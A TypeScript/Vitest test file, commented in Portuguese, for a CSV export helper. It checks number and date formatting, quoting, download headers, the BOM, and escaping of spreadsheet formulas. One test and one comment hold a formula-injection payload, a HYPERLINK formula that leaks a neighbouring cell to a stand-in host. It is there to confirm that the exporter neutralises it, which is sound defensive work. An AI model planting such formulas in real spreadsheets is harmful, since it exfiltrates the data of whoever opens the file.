import { describe, expect, it } from 'vitest';
import { BOM, cabecalho, cabecalhosDeCsv, celula, linha } from '../../server/domain/shared/csv.helper';

// AS QUATRO REGRAS DO CSV (F10, Etapa C) — e as duas que falhariam em silêncio.
//
// Este arquivo é `.puro`: nenhuma conexão, nenhum Postgres, roda em
// milissegundos no pre-commit. O que ele exercita é o lugar onde um defeito de
// CSV não aparece em teste de rota nenhum — a célula.
//
// AS DUAS QUE IMPORTAM MAIS:
//
//   A escapada de fórmula. Uma célula `=HYPERLINK("http://x/?"&A1)` exfiltra
//   dado com um clique de quem abriu a planilha, e nada na resposta HTTP
//   denuncia isso: o arquivo baixa, abre e parece normal.
//
//   O número NEGATIVO. `-1234.50` começa com `-`, que é um dos quatro
//   caracteres de fórmula. Uma escapada aplicada antes da conversão de número
//   escreveria `'-1234.50` — texto, com apóstrofo, numa coluna de dinheiro. O
//   teste existe porque a ordem dos casos dentro de `celula()` é a única coisa
//   que impede isso, e ela é fácil de inverter sem querer.

const PV = ';';

/** O que o Prisma devolve numa coluna `Decimal`: um `Decimal.js`. */
function decimalFalso(valor: string) {
  return { toFixed: () => valor, toString: () => valor };
}

describe('celula — número e data saem crus (D69)', () => {
  it('número usa PONTO decimal e não tem separador de milhar', () => {
    expect(celula(1234.5, PV)).toBe('1234.5');
    expect(celula(0, PV)).toBe('0');
  });

  it('`Decimal` do Prisma sai pelo `toString`, com ponto', () => {
    expect(celula(decimalFalso('1234.50'), PV)).toBe('1234.50');
  });

  it('data sai em AAAA-MM-DD, sem hora e sem fuso', () => {
    expect(celula(new Date('2026-10-01T00:00:00.000Z'), PV)).toBe('2026-10-01');
  });

  it('booleano sai como `true`/`false` — o mesmo que o importador lê de volta', () => {
    expect(celula(true, PV)).toBe('true');
    expect(celula(false, PV)).toBe('false');
  });

  it('nulo e indefinido são célula VAZIA, não a palavra "null"', () => {
    expect(celula(null, PV)).toBe('');
    expect(celula(undefined, PV)).toBe('');
  });

  it('número não finito não escreve `Infinity` na planilha', () => {
    expect(celula(Number.POSITIVE_INFINITY, PV)).toBe('');
    expect(celula(Number.NaN, PV)).toBe('');
  });
});

describe('celula — a escapada de fórmula (D69)', () => {
  it('prefixa os quatro caracteres que o Excel lê como fórmula', () => {
    expect(celula('=1+1', PV)).toBe("'=1+1");
    expect(celula('+SOMA(A1)', PV)).toBe("'+SOMA(A1)");
    expect(celula('-ABC', PV)).toBe("'-ABC");
    expect(celula('@import', PV)).toBe("'@import");
  });

  it('o ataque real: um HYPERLINK que vaza a célula vizinha', () => {
    const malicioso = '=HYPERLINK("http://malicioso/?x"&A1,"clique")';
    const saida = celula(malicioso, PV);

    // As DUAS defesas agem juntas, e nesta ordem: o apóstrofo entra primeiro
    // (é o que impede a fórmula de rodar) e a célula inteira vai entre aspas
    // depois, porque o texto tem `"` dentro. Por isso a saída NÃO começa com
    // `'=` — ela começa com a aspa de abertura, e o apóstrofo está logo
    // depois. Conferir só o começo da string era o que este teste fazia
    // errado.
    expect(saida.startsWith('"\'=')).toBe(true);
    expect(saida).toContain('""http://malicioso/?x""');
  });

  it('NÃO prefixa número negativo — ele é número, não texto', () => {
    // A regressão que este teste guarda: inverter a ordem dos casos dentro de
    // `celula()` escreveria `'-1234.5` numa coluna de custo.
    expect(celula(-1234.5, PV)).toBe('-1234.5');
    expect(celula(decimalFalso('-99.90'), PV)).toBe('-99.90');
  });

  it('texto comum passa intacto', () => {
    expect(celula('ATV-00042', PV)).toBe('ATV-00042');
    expect(celula('Dell Latitude 5420', PV)).toBe('Dell Latitude 5420');
  });
});

describe('celula — aspas e delimitador', () => {
  it('põe entre aspas quando o texto contém o delimitador', () => {
    expect(celula('Ana; Laura', ';')).toBe('"Ana; Laura"');
    // Com OUTRO delimitador, o mesmo texto não precisa de aspas.
    expect(celula('Ana; Laura', ',')).toBe('Ana; Laura');
  });

  it('dobra a aspa interna, que é como o CSV a representa', () => {
    expect(celula('o "notebook" da Ana', PV)).toBe('"o ""notebook"" da Ana"');
  });

  it('põe entre aspas quando há quebra de linha', () => {
    expect(celula('linha 1\nlinha 2', PV)).toBe('"linha 1\nlinha 2"');
  });

  it('a célula escapada que também precisa de aspas recebe as duas coisas', () => {
    expect(celula('=1;2', ';')).toBe('"\'=1;2"');
  });
});

describe('cabeçalho e linha', () => {
  const colunas = [
    { titulo: 'Etiqueta', valor: (l: { tag: string; custo: number | null }) => l.tag },
    { titulo: 'Custo', valor: (l: { tag: string; custo: number | null }) => l.custo },
  ];

  it('o cabeçalho usa os títulos declarados, na ordem declarada', () => {
    expect(cabecalho(colunas, PV)).toBe('Etiqueta;Custo');
  });

  it('a linha percorre as MESMAS colunas do cabeçalho', () => {
    expect(linha({ tag: 'ATV-1', custo: 1234.5 }, colunas, PV)).toBe('ATV-1;1234.5');
    expect(linha({ tag: 'ATV-2', custo: null }, colunas, PV)).toBe('ATV-2;');
  });
});

describe('cabecalhosDeCsv', () => {
  it('declara utf-8 e manda baixar com data no nome', () => {
    const headers = cabecalhosDeCsv('ativos', new Date('2026-10-01T12:00:00Z'));

    expect(headers['Content-Type']).toBe('text/csv; charset=utf-8');
    expect(headers['Content-Disposition']).toContain('attachment');
    expect(headers['Content-Disposition']).toContain('ativos-2026-10-01.csv');
  });

  it('nome com acento vai nas duas formas: sem acento e em UTF-8 percent-encoded', () => {
    const headers = cabecalhosDeCsv('licencas-ativas', new Date('2026-10-01T12:00:00Z'));
    expect(headers['Content-Disposition']).toContain("filename*=UTF-8''");
  });

  it('não deixa a resposta em cache de proxy', () => {
    expect(cabecalhosDeCsv('ativos')['Cache-Control']).toContain('no-store');
  });
});

describe('O BOM', () => {
  it('é o caractere U+FEFF, e é ele que faz o Excel em pt-BR ler UTF-8', () => {
    expect(BOM).toBe('﻿');
    expect(Buffer.from(BOM, 'utf8')).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
  });
});
